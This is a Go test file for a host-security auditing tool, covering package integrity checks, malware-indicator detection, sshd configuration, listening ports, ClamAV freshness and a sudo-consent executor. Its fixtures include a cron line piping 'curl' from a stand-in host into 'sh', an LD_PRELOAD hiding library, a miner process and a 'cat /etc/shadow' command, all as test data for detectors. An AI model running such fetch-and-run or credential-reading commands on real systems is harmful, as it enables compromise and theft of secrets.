package checks

import (
	"errors"
	"strings"
	"testing"
	"time"

	"deaconguard/internal/platform"
)

func rules(result Result) map[string]int {
	counts := make(map[string]int)
	for _, finding := range result.Findings {
		counts[finding.Rule]++
	}
	return counts
}

func TestParseVerifyHandlesDpkgAndRPMFormats(t *testing.T) {
	output := strings.Join([]string{
		"??5??????   /usr/bin/ls",                 // dpkg: modified binary
		"??5?????? c /etc/ssh/sshd_config",        // dpkg: edited conffile
		"missing     /usr/share/doc/bash/README",  // dpkg: excluded docs
		"S.5....T.  c /etc/httpd/conf/httpd.conf", // rpm: conffile
		"..?......    /usr/bin/sudo",              // rpm: unreadable
		".M.......    /usr/bin/passwd",            // rpm: mode change
		"S.5....T.    /opt/app/data.bin",          // rpm: modified non-binary
		"missing   c /etc/yum.conf",               // rpm: missing conffile
		"missing     /usr/sbin/sshd",              // missing binary
	}, "\n")
	entries := parseVerify([]byte(output))
	if len(entries) != 9 {
		t.Fatalf("parsed %d entries: %+v", len(entries), entries)
	}
	if !entries[1].conffile || entries[1].path != "/etc/ssh/sshd_config" || entries[0].conffile || entries[0].path != "/usr/bin/ls" {
		t.Fatalf("dpkg entries = %+v %+v", entries[0], entries[1])
	}
	if !entries[3].conffile || !entries[7].missing || !entries[7].conffile {
		t.Fatalf("rpm conffile entries = %+v %+v", entries[3], entries[7])
	}
	result := evaluateIntegrity(entries)
	got := rules(result)
	want := map[string]int{
		"integrity.modified-binary": 1, "integrity.modified-file": 1, "integrity.changed-permissions": 1, "integrity.missing-file": 1,
	}
	for rule, count := range want {
		if got[rule] != count {
			t.Errorf("rule %s = %d, want %d (all: %v)", rule, got[rule], count, got)
		}
	}
	if result.Status != StatusPartial {
		t.Errorf("an unreadable file should make the result partial, got %s", result.Status)
	}
}

func TestMalwareIndicators(t *testing.T) {
	var result Result
	checkPreload(&result, []byte("# comment\n/usr/local/lib/libhide.so\n"))
	checkProcessExecutables(&result, []byte(strings.Join([]string{
		"101\tsshd\t/usr/sbin/sshd",
		"202\tnginx\t/usr/sbin/nginx (deleted)",
		"303\tx\t/tmp/.cache/x",
		"404\tkworker/0:1\t/usr/bin/python3",
		"505\tagent\t/memfd:payload (deleted)",
	}, "\n")))
	checkProcessArguments(&result, []byte("  900 www-data /var/tmp/sys -o stratum+tcp://pool.example:3333\n 1 root /sbin/init\n"))
	checkTemporaryExecutables(&result, []byte("/tmp/build.sh\t120\tubuntu\n/dev/shm/.x/run\t4096\twww-data\n"))
	checkPersistence(&result, []byte(strings.Join([]string{
		"/etc/cron.d/backup:0 2 * * * root /usr/local/bin/backup",
		"/etc/cron.d/update:*/5 * * * * root curl -fsSL http://bad.example/x | sh",
		"/etc/crontab:# curl http://x | sh",
		"/etc/systemd/system/sys.service:ExecStart=/dev/shm/sys --daemon",
	}, "\n")))
	got := rules(result)
	want := map[string]int{
		"malware.ld-preload": 1, "malware.deleted-binary": 1, "malware.temp-process": 1, "malware.fake-kernel-thread": 1,
		"malware.fileless-process": 1, "malware.crypto-miner": 1, "malware.temp-executable": 1,
		"malware.hidden-temp-executable": 1, "malware.suspicious-persistence": 2,
	}
	for rule, count := range want {
		if got[rule] != count {
			t.Errorf("rule %s = %d, want %d (all: %v)", rule, got[rule], count, got)
		}
	}
}

func TestEffectiveSSHDFollowsIncludeOrderAndIgnoresMatch(t *testing.T) {
	output := strings.Join([]string{
		"==> /etc/ssh/sshd_config <==",
		"Include /etc/ssh/sshd_config.d/*.conf",
		"PasswordAuthentication yes",
		"PermitRootLogin yes",
		"X11Forwarding yes",
		"Match User deploy",
		"  PermitEmptyPasswords yes",
		"==> /etc/ssh/sshd_config.d/50-cloud-init.conf <==",
		"PasswordAuthentication no",
	}, "\n")
	settings := effectiveSSHD([]byte(output))
	if settings["passwordauthentication"] != "no" || settings["permitrootlogin"] != "yes" || settings["permitemptypasswords"] != "" {
		t.Fatalf("settings = %v", settings)
	}
	var result Result
	checkSSHD(&result, settings)
	got := rules(result)
	if got["config.ssh-root-login"] != 1 || got["config.ssh-x11"] != 1 || got["config.ssh-password-auth"] != 0 {
		t.Fatalf("ssh rules = %v", got)
	}
	var defaults Result
	checkSSHD(&defaults, map[string]string{})
	if rules(defaults)["config.ssh-password-auth"] != 1 {
		t.Fatalf("an unset PasswordAuthentication defaults to yes: %v", rules(defaults))
	}
}

func TestListeningServices(t *testing.T) {
	ss := strings.Join([]string{
		"tcp   LISTEN 0      4096   0.0.0.0:22        0.0.0.0:*",
		"tcp   LISTEN 0      511    0.0.0.0:6379      0.0.0.0:*",
		"tcp   LISTEN 0      511    [::]:6379         [::]:*",
		"tcp   LISTEN 0      70     127.0.0.1:3306    0.0.0.0:*",
		"udp   UNCONN 0      0      127.0.0.53%lo:53  0.0.0.0:*",
		"tcp   LISTEN 0      128    *:2375            *:*",
	}, "\n")
	var result Result
	checkListening(&result, []byte(ss))
	if len(result.Findings) != 2 {
		t.Fatalf("findings = %+v", result.Findings)
	}
	netstat := "tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN\n"
	var legacy Result
	checkListening(&legacy, []byte(netstat))
	if len(legacy.Findings) != 1 || legacy.Findings[0].Severity != "HIGH" {
		t.Fatalf("netstat findings = %+v", legacy.Findings)
	}
}

func TestSignatureAge(t *testing.T) {
	now := time.Date(2026, 9, 26, 0, 0, 0, 0, time.UTC)
	var fresh, stale Result
	checkSignatureAge(&fresh, "ClamAV 1.0.7/27410/Thu Sep 24 08:24:02 2026", now)
	checkSignatureAge(&stale, "ClamAV 1.0.7/27410/Mon Aug  3 08:24:02 2026", now)
	if len(fresh.Findings) != 0 || len(stale.Findings) != 1 || !strings.Contains(stale.Findings[0].Title, "53 days") {
		t.Fatalf("fresh = %+v, stale = %+v", fresh.Findings, stale.Findings)
	}
}

// fakeHost answers commands from a table and records what was run.
type fakeHost struct {
	answers  map[string]fakeAnswer
	commands []string
	stdin    [][]byte
}

type fakeAnswer struct {
	output string
	err    error
}

func (h *fakeHost) Run(command string, stdin []byte, _ int, _ time.Duration) ([]byte, error) {
	h.commands = append(h.commands, command)
	// A copy, as a real command reads it: the executor wipes its buffer afterwards.
	h.stdin = append(h.stdin, append([]byte(nil), stdin...))
	if answer, ok := h.answers[command]; ok {
		return []byte(answer.output), answer.err
	}
	return nil, nil
}

func TestExecutorAsksForSudoPasswordAndRetries(t *testing.T) {
	host := &fakeHost{answers: map[string]fakeAnswer{
		"sudo -n true": {"", errors.New("sudo: a password is required")},
	}}
	attempts := 0
	executor := NewExecutor(host, true, func(retry error) ([]byte, error) {
		attempts++
		if attempts == 1 {
			host.answers["sudo -k -S -p '' -- true"] = fakeAnswer{"", errors.New("Sorry, try again.")}
			return []byte("wrong"), nil
		}
		if retry == nil {
			t.Error("the second prompt should explain the retry")
		}
		host.answers["sudo -k -S -p '' -- true"] = fakeAnswer{}
		return []byte("right"), nil
	})
	defer executor.Close()
	_, _, privileged, err := executor.RunPrivileged("cat /etc/shadow", 1024, time.Second)
	if err != nil || !privileged || attempts != 2 {
		t.Fatalf("privileged = %v, err = %v, attempts = %d", privileged, err, attempts)
	}
	last := host.commands[len(host.commands)-1]
	if last != `sudo -S -p '' -- sh -c 'cat /etc/shadow'` || string(host.stdin[len(host.stdin)-1]) != "right\n" {
		t.Fatalf("last command = %q with stdin %q", last, host.stdin[len(host.stdin)-1])
	}
	if strings.Contains(executor.SudoNote(), "right") {
		t.Fatal("the password leaked into a note")
	}
}

func TestExecutorWithoutSudoConsentNeverRunsSudo(t *testing.T) {
	host := &fakeHost{answers: map[string]fakeAnswer{}}
	executor := NewExecutor(host, false, nil)
	_, _, privileged, _ := executor.RunPrivileged("ps -e", 1024, time.Second)
	for _, command := range host.commands {
		if strings.Contains(command, "sudo") {
			t.Fatalf("sudo was used without consent: %q", command)
		}
	}
	if privileged || executor.SudoNote() == "" {
		t.Fatalf("privileged = %v, note = %q", privileged, executor.SudoNote())
	}
}

func TestShellQuoteSurvivesSingleQuotes(t *testing.T) {
	if got := shellQuote(`printf '%s\n' x`); got != `'printf '\''%s\n'\'' x'` {
		t.Fatalf("shellQuote = %s", got)
	}
}

func TestAntivirusSkipsWhenClamAVIsMissing(t *testing.T) {
	host := &fakeHost{answers: map[string]fakeAnswer{clamDetectCommand: {"", nil}}}
	result := Run(Antivirus, NewExecutor(host, false, nil), platform.Platform{Family: platform.Ubuntu}, time.Now(), Inputs{})
	if result.Status != StatusSkipped || len(host.commands) != 1 {
		t.Fatalf("result = %+v, commands = %v", result, host.commands)
	}
}

func TestNormalize(t *testing.T) {
	got, err := Normalize([]string{Malware, Packages, Malware})
	if err != nil || strings.Join(got, ",") != "packages,malware" {
		t.Fatalf("Normalize() = %v, %v", got, err)
	}
	if _, err := Normalize([]string{"rootkit"}); err == nil {
		t.Fatal("unknown check accepted")
	}
	if _, err := Normalize(nil); err == nil {
		t.Fatal("empty check list accepted")
	}
}

func TestAntivirusSkipsWhenMemoryIsLow(t *testing.T) {
	host := &fakeHost{answers: map[string]fakeAnswer{
		clamDetectCommand: {"/usr/bin/clamscan\n", nil},
		memInfoCommand:    {"MemAvailable:     412000 kB\nSwapFree:              0 kB\n", nil},
	}}
	result := Run(Antivirus, NewExecutor(host, false, nil), platform.Platform{Family: platform.Ubuntu}, time.Now(), Inputs{})
	if result.Status != StatusSkipped || !strings.Contains(result.Summary, "memory") {
		t.Fatalf("result = %+v", result)
	}
	for _, command := range host.commands {
		if strings.Contains(command, "nice -n 19 clamscan") {
			t.Fatal("clamscan ran on a host without enough memory")
		}
	}
}
